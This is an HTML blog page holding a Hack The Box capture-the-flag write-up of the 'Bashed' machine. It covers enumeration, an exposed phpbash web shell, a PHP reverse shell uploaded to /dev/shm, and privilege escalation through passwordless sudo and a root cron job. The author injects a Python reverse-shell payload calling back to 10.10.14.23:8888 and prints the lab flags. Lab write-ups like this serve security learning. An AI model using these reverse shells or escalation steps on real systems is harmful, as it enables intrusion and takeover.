<!doctype html> <head> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1"> <meta name=theme-color content=#333333> <base href=/logbook/ > <link href=global.css rel=stylesheet> <link href=fonts.css rel=stylesheet> <link href=highlight.css rel=stylesheet> <link href=manifest.json rel=manifest> <link href=as-logo2.ico rel=icon type=image/png> <link href=client/main.1326331395.css rel=stylesheet> <noscript id=sapper-head-start></noscript><title>HTB - Bashed</title><meta content=article property=og:type><meta content="HTB - Bashed" property=og:title><meta name=Description content=""><meta content="" property=og:description><meta name=twitter:card content=summary_large_image><meta name=twitter:title value="HTB - Bashed"><meta name=twitter:description content=""><meta name=twitter:label1 value="Published on"><meta name=twitter:data1 value="Apr 26, 2021"><meta name=twitter:label2 value="Reading Time"><meta name=twitter:data2 value="4 min read"><noscript id=sapper-head-end></noscript> </head> <body> <div id=sapper> <div class="svelte-v25qrq layout"> <header class=svelte-y9ah38> <a href=/ > <img alt=Sapper src=as-logo2.ico class=svelte-1u41owj> </a> <nav class=svelte-16qpxtx> <a href=. class=svelte-16qpxtx>Home</a> <a href=blog rel=prefetch class="svelte-16qpxtx selected">Blog</a> <a href=https://anu-bhav.github.io class=svelte-16qpxtx>Website</a> </nav> </header> <main class=svelte-v25qrq> <header class=svelte-ww3xvk> <p class=svelte-ww3xvk>April 26, 2021 ~ 4 min read</p> <h1 class=svelte-ww3xvk>HTB - Bashed</h1> <a href=pdf/Bashed.pdf target=_blank rel=nofollow class=svelte-ww3xvk id=pdf_link>View As PDF</a> <hr class=svelte-ww3xvk> </header> <div class=container> <article class=content> <h1 id=bashed---10101068>Bashed - 10.10.10.68</h1> <h1 id=enumeration>Enumeration</h1> <h2 id=nmap>Nmap</h2> <pre class=language-bash><code class=language-bash>nmap -sC -sV -oA nmap/initial 10.10.10.68</code></pre><pre class=language-bash><code class=language-bash>Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 05:02 EDT
Nmap scan report for 10.10.10.68
Host is up (0.24s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.45 seconds</code></pre><h2 id=gobuster>Gobuster</h2> <p>Enumerating the Apache webserver with gobuster.</p> <pre class=language-bash><code class=language-bash>gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o log/gobuster.out -u http://10.10.10.68 </code></pre><pre class=language-bash><code class=language-bash>/.htpasswd            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/server-status        (Status: 403) [Size: 299]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]</code></pre><h2 id=website>Website</h2> <p><img alt="" src=Bashed.assets/image-20210426050746209.png></p> <p>The github link, <a href=https://github.com/Arrexel/phpbash target=_blank rel=nofollow>https://github.com/Arrexel/phpbash</a> reveals partial code of the website.</p> <p><img alt="" src=Bashed.assets/image-20210426051313928.png></p> <p><img alt="" src=Bashed.assets/image-20210426051347480.png></p> <p><img alt="" src=Bashed.assets/image-20210426051413896.png></p> <p>Both files <strong><a href=http://10.10.10.68/dev/phpbash.php target=_blank rel=nofollow>phpbash.php</a></strong> and <strong><a href=http://10.10.10.68/dev/phpbash.min.php target=_blank rel=nofollow>phpbash.min.php</a></strong> looks to be the same as in the github repository. Hence source code is revealed.</p> <p>The page <a href=http://10.10.10.68/dev/phpbash.php target=_blank rel=nofollow>http://10.10.10.68/dev/phpbash.php</a> is an interactive shell coded in php.</p> <p><img alt="" src=Bashed.assets/image-20210426051717761.png></p> <h1 id=exploitation>Exploitation</h1> <h3 id=getting-a-reverse-shell>Getting a reverse shell</h3> <p>Going to <strong>/dev/shm</strong>, the attacker can upload a reverse shell as normally anyone can write to <strong>/dev/shm</strong>.</p> <p><img alt="" src=Bashed.assets/image-20210426053142178.png></p> <p>Normally on kali linux, these are some default location where php reverse shells can be found.</p> <pre class=language-bash><code class=language-bash>$ locate php-reverse                                                                             
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php</code></pre><p><img alt="" src=Bashed.assets/image-20210426052146005.png></p> <p>Editing the php reverse shell to connect to the attacker's IP address.</p> <p><img alt="" src=Bashed.assets/image-20210426052531204.png></p> <p>The attacker then hosts a http server and also setup <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p> <pre class=language-bash><code class=language-bash>nc -lvnp 8888
python3 -m http.server 80  </code></pre><p><img alt="" src=Bashed.assets/image-20210426053314010.png></p> <p><img alt="" src=Bashed.assets/image-20210426053359115.png></p> <p>After running the reverse shell on the server, the attacker gets a <strong>nc</strong> connection.</p> <p><img alt="" src=Bashed.assets/image-20210426053608498.png></p> <p>The reverse shell is then stabilised using the following commands.</p> <pre class=language-bash><code class=language-bash>which python # to know which python version exists
python -c 'import pty;pty.spawn("/bin/bash")' # gets a proper tty shell
# the shell is then backgrounded using ctrl+z
stty raw -echo # this is executed on the attackers machine
# then press fg to resume the tty shell
export TERM=xterm # after setting the terminal type, the screen can now be cleared</code></pre><p><img alt="" src=Bashed.assets/image-20210426053953530.png></p> <h2 id=privilege-escalation-to-scriptmanager>Privilege Escalation to scriptmanager</h2> <h3 id=vulnerability-explanation><strong>Vulnerability Explanation:</strong></h3> <p>As can be seen below, the user <strong>www-data</strong> can execute any command as the user <strong>scriptmanager</strong> <em>without the need of a password</em></p> <p><img alt="" src=Bashed.assets/image-20210426054917421.png></p> <h3 id=usertxt>User.txt</h3> <pre class=language-bash><code class=language-bash>find /home -type f -ls 2>/dev/null</code></pre><p>The above command finds everything having the type <strong>file</strong> in the directory <strong>/home</strong>, as well as listing all the attributes of each file and finally <strong>2>/dev/null</strong> mean to redirect standard error to <strong>/dev/null</strong>.</p> <p><img alt="" src=Bashed.assets/image-20210426060250953.png></p> <p><strong>User.txt</strong> can be found in the home directory of <strong>arrexel</strong> and it can be read anyone.</p> <pre class=language-bash><code class=language-bash>cat /home/arrexel/user.txt</code></pre><p><img alt="" src=Bashed.assets/image-20210426061019511.png></p> <blockquote> <p>user.txt flag: <code>2c281f318555dbc1b856957c7147bfc1</code></p> </blockquote> <h2 id=privilege-escalation-to-root>Privilege Escalation to Root</h2> <h3 id=roottxt>Root.txt</h3> <p>The directory <strong>scripts</strong> standards out as it is not an standard directory.</p> <p><img alt="" src=Bashed.assets/image-20210426061419226.png></p> <h3 id=vulnerability-explanation-1><strong>Vulnerability Explanation:</strong></h3> <p>Going into the directory <strong>script</strong>, it can be concluded that there has to be a <strong>cronjob</strong> running on the machine as the date created of the file <strong>test.txt</strong> keeps changing <strong>every minute</strong>.</p> <p><img alt="" src=Bashed.assets/image-20210426061811213.png></p> <p>Since the script <strong>test.py</strong> is owned by <strong>scriptmanager</strong> and it is writing to the file <strong>test.txt</strong> as root. It can be said that the attacker can modify the script and it will be ran as root.</p> <pre class=language-bash><code class=language-bash>cat test.py</code></pre><pre class=language-python><code class=language-python>f = open("test.txt", "w")
f.write("testing 123!")
f.close</code></pre><p>RSG is used to generate a reverse shell in python and it also listens on the port specified. After adding the selected payload to the file <strong>test.py</strong>, it will be executed by the cronjob when it runs.</p> <pre class=language-python><code class=language-python>import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.23",8888))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
f = open("test.txt", "w")
f.write("testing 123!")
f.close</code></pre><p><img alt="" src=Bashed.assets/image-20210426063556805.png></p> <p>As soon as the <strong>cronjab</strong> executes, the attacker gets a reverse shell from the machine bashed.</p> <p><img alt="" src=Bashed.assets/image-20210426064607146.png></p> <p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p> <pre class=language-bash><code class=language-bash>cat /root/root.txt</code></pre><p><img alt="" src=Bashed.assets/image-20210426065148940.png></p> <blockquote> <p>root.txt flag: <code>cc4f0afe3a1026d402ba10329674a8e2</code></p> </blockquote> </article> <hr> <button class="back-to-top hidden svelte-h76b9j"> <svg aria-hidden=true class="" id="" role=img style=height:1em;line-height:.75em;font-size:1.33333em;vertical-align:-.225em;overflow:visible viewBox="0 0 448 512" xmlns=http://www.w3.org/2000/svg> <g transform="translate(256 256)"> <g transform=""> <path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z" fill=currentColor transform="translate(-256 -256)"></path> </g> </g> </svg> </button> <div class=svelte-16tlu6p> <img alt="Anubhavsingh Sawdagur" src=profile-pic.png class=svelte-16tlu6p> <p class=svelte-16tlu6p> Hi, I'm <strong class=highlight>Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer from Mauritius. <br> You can find me on <a href=https://www.instagram.com/_anu_bhav_/ target=_blank>Instagram</a>, <a href=https://www.twitter.com/0_Pr0t0typ3/ target=_blank>Twitter</a>, <a href=https://www.facebook.com/anubhav.s.0809/ target=_blank>Facebook</a> or <a href=https://www.linkedin.com/in/anubhavsingh-sawdagur/ target=_blank>LinkedIn</a>. See more of my work on <a href="https://github.com/Anu-bhav?tab=repositories" target=_blank>GitHub</a> or read about me on my <a href=https://anu-bhav.github.io/ target=_blank>Website</a> </p> </div> </div> </main> <footer class=svelte-v25qrq> <span> © 2021 Personal Blog. Powered by <a href=https://sapper.svelte.dev target=_blank>Sapper</a>. Template by <a href=https://anu-bhav.github.io target=_blank>Anubhavsingh Sawdagur</a>. </span> </footer> </div></div> <script>__SAPPER__={baseUrl:"/logbook",preloaded:[void 0,null,{pdf_location:"pdf\u002FBashed.pdf",has_pdf:true,post:{title:"HTB - Bashed",slug:"Bashed",html:"\u003Ch1 id=\"bashed---10101068\"\u003EBashed - 10.10.10.68\u003C\u002Fh1\u003E\n\u003Ch1 id=\"enumeration\"\u003EEnumeration\u003C\u002Fh1\u003E\n\u003Ch2 id=\"nmap\"\u003ENmap\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Enmap -sC -sV -oA nmap\u002Finitial 10.10.10.68\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003EStarting Nmap 7.91 ( https:\u002F\u002Fnmap.org ) at 2021-04-26 05:02 EDT\nNmap scan report for 10.10.10.68\nHost is up (0.24s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80\u002Ftcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache\u002F2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\n\nService detection performed. Please report any incorrect results at https:\u002F\u002Fnmap.org\u002Fsubmit\u002F .\nNmap done: 1 IP address (1 host up) scanned in 35.45 seconds\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch2 id=\"gobuster\"\u003EGobuster\u003C\u002Fh2\u003E\n\u003Cp\u003EEnumerating the Apache webserver with gobuster.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Egobuster dir -t 50 -w \u002Fusr\u002Fshare\u002Fseclists\u002FDiscovery\u002FWeb-Content\u002Fcommon.txt -o log\u002Fgobuster.out -u http:\u002F\u002F10.10.10.68 \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E\u002F.htpasswd            (Status: 403) [Size: 295]\n\u002F.hta                 (Status: 403) [Size: 290]\n\u002F.htaccess            (Status: 403) [Size: 295]\n\u002Fcss                  (Status: 301) [Size: 308] [--\u003E http:\u002F\u002F10.10.10.68\u002Fcss\u002F]\n\u002Fdev                  (Status: 301) [Size: 308] [--\u003E http:\u002F\u002F10.10.10.68\u002Fdev\u002F]\n\u002Ffonts                (Status: 301) [Size: 310] [--\u003E http:\u002F\u002F10.10.10.68\u002Ffonts\u002F]\n\u002Fimages               (Status: 301) [Size: 311] [--\u003E http:\u002F\u002F10.10.10.68\u002Fimages\u002F]\n\u002Findex.html           (Status: 200) [Size: 7743]\n\u002Fjs                   (Status: 301) [Size: 307] [--\u003E http:\u002F\u002F10.10.10.68\u002Fjs\u002F]\n\u002Fphp                  (Status: 301) [Size: 308] [--\u003E http:\u002F\u002F10.10.10.68\u002Fphp\u002F]\n\u002Fserver-status        (Status: 403) [Size: 299]\n\u002Fuploads              (Status: 301) [Size: 312] [--\u003E http:\u002F\u002F10.10.10.68\u002Fuploads\u002F]\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch2 id=\"website\"\u003EWebsite\u003C\u002Fh2\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426050746209.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe github link, \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fgithub.com\u002FArrexel\u002Fphpbash\"\u003Ehttps:\u002F\u002Fgithub.com\u002FArrexel\u002Fphpbash\u003C\u002Fa\u003E reveals partial code of the website.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426051313928.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426051347480.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426051413896.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EBoth files \u003Cstrong\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002F10.10.10.68\u002Fdev\u002Fphpbash.php\"\u003Ephpbash.php\u003C\u002Fa\u003E\u003C\u002Fstrong\u003E and \u003Cstrong\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002F10.10.10.68\u002Fdev\u002Fphpbash.min.php\"\u003Ephpbash.min.php\u003C\u002Fa\u003E\u003C\u002Fstrong\u003E looks to be the same as in the github repository. Hence source code is revealed.\u003C\u002Fp\u003E\n\u003Cp\u003EThe page \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002F10.10.10.68\u002Fdev\u002Fphpbash.php\"\u003Ehttp:\u002F\u002F10.10.10.68\u002Fdev\u002Fphpbash.php\u003C\u002Fa\u003E is an interactive shell coded in php.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426051717761.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch1 id=\"exploitation\"\u003EExploitation\u003C\u002Fh1\u003E\n\u003Ch3 id=\"getting-a-reverse-shell\"\u003EGetting a reverse shell\u003C\u002Fh3\u003E\n\u003Cp\u003EGoing to \u003Cstrong\u003E\u002Fdev\u002Fshm\u003C\u002Fstrong\u003E, the attacker can upload a reverse shell as normally anyone can write to \u003Cstrong\u003E\u002Fdev\u002Fshm\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426053142178.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003ENormally on kali linux, these are some default location where php reverse shells can be found.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E$ locate php-reverse                                                                             \n\u002Fusr\u002Fshare\u002Flaudanum\u002Fphp\u002Fphp-reverse-shell.php\n\u002Fusr\u002Fshare\u002Flaudanum\u002Fwordpress\u002Ftemplates\u002Fphp-reverse-shell.php\n\u002Fusr\u002Fshare\u002Fseclists\u002FWeb-Shells\u002Flaudanum-0.8\u002Fphp\u002Fphp-reverse-shell.php\n\u002Fusr\u002Fshare\u002Fwebshells\u002Fphp\u002Fphp-reverse-shell.php\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426052146005.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EEditing the php reverse shell to connect to the attacker&#39;s IP address.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426052531204.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe attacker then hosts a http server and also setup \u003Cstrong\u003Enc\u003C\u002Fstrong\u003E to listen for an incoming connection on port \u003Cstrong\u003E8888\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Enc -lvnp 8888\npython3 -m http.server 80  \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426053314010.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426053359115.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAfter running the reverse shell on the server, the attacker gets a \u003Cstrong\u003Enc\u003C\u002Fstrong\u003E connection.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426053608498.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe reverse shell is then stabilised using the following commands.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ewhich python # to know which python version exists\npython -c 'import pty;pty.spawn(\"\u002Fbin\u002Fbash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426053953530.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"privilege-escalation-to-scriptmanager\"\u003EPrivilege Escalation to scriptmanager\u003C\u002Fh2\u003E\n\u003Ch3 id=\"vulnerability-explanation\"\u003E\u003Cstrong\u003EVulnerability Explanation:\u003C\u002Fstrong\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EAs can be seen below, the user \u003Cstrong\u003Ewww-data\u003C\u002Fstrong\u003E can execute any command as the user \u003Cstrong\u003Escriptmanager\u003C\u002Fstrong\u003E \u003Cem\u003Ewithout the need of a password\u003C\u002Fem\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426054917421.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"usertxt\"\u003EUser.txt\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Efind \u002Fhome -type f -ls 2\u003E\u002Fdev\u002Fnull\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe above command finds everything having the type \u003Cstrong\u003Efile\u003C\u002Fstrong\u003E in the directory \u003Cstrong\u003E\u002Fhome\u003C\u002Fstrong\u003E, as well as listing all the attributes of each file and finally \u003Cstrong\u003E2&gt;\u002Fdev\u002Fnull\u003C\u002Fstrong\u003E mean to redirect standard error to \u003Cstrong\u003E\u002Fdev\u002Fnull\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426060250953.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EUser.txt\u003C\u002Fstrong\u003E can be found in the home directory of \u003Cstrong\u003Earrexel\u003C\u002Fstrong\u003E and it can be read anyone.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Fhome\u002Farrexel\u002Fuser.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426061019511.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Euser.txt flag: \u003Ccode\u003E2c281f318555dbc1b856957c7147bfc1\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch2 id=\"privilege-escalation-to-root\"\u003EPrivilege Escalation to Root\u003C\u002Fh2\u003E\n\u003Ch3 id=\"roottxt\"\u003ERoot.txt\u003C\u002Fh3\u003E\n\u003Cp\u003EThe directory \u003Cstrong\u003Escripts\u003C\u002Fstrong\u003E standards out as it is not an standard directory.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426061419226.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"vulnerability-explanation-1\"\u003E\u003Cstrong\u003EVulnerability Explanation:\u003C\u002Fstrong\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EGoing into the directory \u003Cstrong\u003Escript\u003C\u002Fstrong\u003E, it can be concluded that there has to be a \u003Cstrong\u003Ecronjob\u003C\u002Fstrong\u003E running on the machine as the date created of the file \u003Cstrong\u003Etest.txt\u003C\u002Fstrong\u003E keeps changing \u003Cstrong\u003Eevery minute\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426061811213.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003ESince the script \u003Cstrong\u003Etest.py\u003C\u002Fstrong\u003E is owned by \u003Cstrong\u003Escriptmanager\u003C\u002Fstrong\u003E and it is writing to the file \u003Cstrong\u003Etest.txt\u003C\u002Fstrong\u003E as root. It can be said that the attacker can modify the script and it will be ran as root.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat test.py\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-python\"\u003E\u003Ccode class=\"language-python\"\u003Ef = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003ERSG is used to generate a reverse shell in python and it also listens on the port specified. After adding the selected payload to the file \u003Cstrong\u003Etest.py\u003C\u002Fstrong\u003E, it will be executed by the cronjob when it runs.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-python\"\u003E\u003Ccode class=\"language-python\"\u003Eimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.10.14.23\",8888))\nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2);import pty; pty.spawn(\"\u002Fbin\u002Fsh\")\nf = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426063556805.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAs soon as the \u003Cstrong\u003Ecronjab\u003C\u002Fstrong\u003E executes, the attacker gets a reverse shell from the machine bashed.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426064607146.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Ethe \u003Cstrong\u003Eroot.txt\u003C\u002Fstrong\u003E file is always located in \u003Cstrong\u003E\u002Froot\u002F\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Froot\u002Froot.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Bashed.assets\u002Fimage-20210426065148940.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Eroot.txt flag: \u003Ccode\u003Ecc4f0afe3a1026d402ba10329674a8e2\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n",date:"2021-04-26",excerpt:"",printDate:"April 26, 2021",printReadingTime:"4 min read"}}]};if('serviceWorker' in navigator)navigator.serviceWorker.register('/logbook/service-worker.js');(function(){try{eval("async function x(){}");var main="/logbook/client/client.84164a31.js"}catch(e){main="/logbook/client/legacy/client.a2735aa5.js"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="/logbook/client/shimport@1.0.1.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());</script> 